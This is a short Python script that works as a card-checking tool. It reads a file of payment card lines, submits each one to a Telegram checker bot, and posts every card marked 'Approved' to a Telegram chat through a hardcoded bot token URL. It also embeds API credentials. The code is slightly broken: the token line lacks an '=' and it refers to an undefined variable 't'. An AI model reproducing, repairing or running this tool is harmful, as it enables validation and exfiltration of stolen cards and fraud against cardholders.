#TDP_SAKKY
import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
ch = "@kurumichkbot"
api_id = "22955184"
api_hash = "61d3cfb7c616055ee508a7b804e6c027"
ID = "-1001961336323"
token"6564492985:AAHxeuhR_4coAQa0sxaJxhQOa9MUaDTzN6w"
combo = input(X+'ENTER YOU COMBO NAME : '+F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/an {cc}")
        time.sleep(random.randint(40,45))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}")
            time.sleep(t+1)
        ccn = mssag[0].message
        if 'Approve' in ccn :
            print(F+'Approved✅ | RINAOP : @rinashaikh17.')
            mgs=f'''• Card checked by @RINASHAIKH17✅.
{ccn} .
@RINASHAIKH17✔️'''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else :
            print(Z+'Declined❌ | REENAOP : @REENASHAIKH17.')
    except:
        print(False)
        #@TDP_SAKKY